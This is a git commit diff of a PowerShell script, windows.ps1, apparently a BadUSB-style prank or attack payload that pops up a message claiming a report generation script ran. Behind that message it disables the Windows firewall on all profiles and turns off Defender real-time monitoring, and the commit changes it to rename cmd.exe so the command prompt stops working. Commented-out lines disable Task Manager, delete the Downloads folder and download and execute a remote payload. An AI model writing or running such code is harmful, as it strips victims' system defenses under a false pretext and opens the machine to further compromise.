c3c603fc156403f4f4759ad85fc6f3a60617a301
Miguel Santos <miguelsantos029@gmail.com>
2025-08-22 02:04:07 +0100

    Update windows.ps1

--- windows.ps1
+++ windows.ps1
@@ -1,14 +1,15 @@
-#3
+#4
 $wshell = New-Object -ComObject Wscript.Shell
 $wshell.Popup("The report generation script is executed!d")
 #reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
-Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name "DisableCMD" -Value 2 -Type DWord
+Rename-Item "$env:SystemRoot\System32\cmd.exe" "cmd_disabled.exe"
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 Set-MpPreference -DisableRealtimeMonitoring $true
 #Restart-Computer -Force
 #Remove-Item -Path "$env:USERPROFILE\Downloads\*" -Recurse -Force
 #$pl = iwr "https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Wallpaper-Troll/Wallpaper-Troll.ps1?dl=1"; invoke-expression $pl
 exit
+
 
 
 
